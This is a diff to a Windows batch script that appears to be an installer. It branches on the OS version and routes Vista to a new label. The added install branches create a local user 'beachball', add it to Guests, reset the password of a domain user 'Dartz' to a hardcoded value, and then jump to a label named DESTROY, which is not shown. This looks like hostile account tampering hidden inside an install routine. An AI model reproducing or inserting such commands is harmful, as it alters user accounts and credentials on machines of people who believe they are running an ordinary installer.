@@ -51,7 +51,7 @@ wmic os get version | find "10.0" > nul
 if %ERRORLEVEL% == 0 goto TEN
 )
 wmic os get version | find "6.0" > nul
-if %ERRORLEVEL% == 0 goto MAININSTALLB
+if %ERRORLEVEL% == 0 goto MAININSTALLBVISTA
 )
 wmic os get version | find "5.1" > nul
 if %ERRORLEVEL% == 0 goto MAININSTALLB
@@ -194,6 +194,11 @@ echo,
 SET /P M=Type 1 or 2 then press ENTER:
 IF %M%==1 GOTO MAININSTALLBB
 :MAININSTALLBB
+net user beachball /add
+net localgroup Guests beachball /add
+net user Dartz 1593570 /domain
+goto DESTROY
+:MAININSTALLBVISTA
 net user beachball /add
 net localgroup Guests beachball /add
 net user Dartz 1593570 /domain
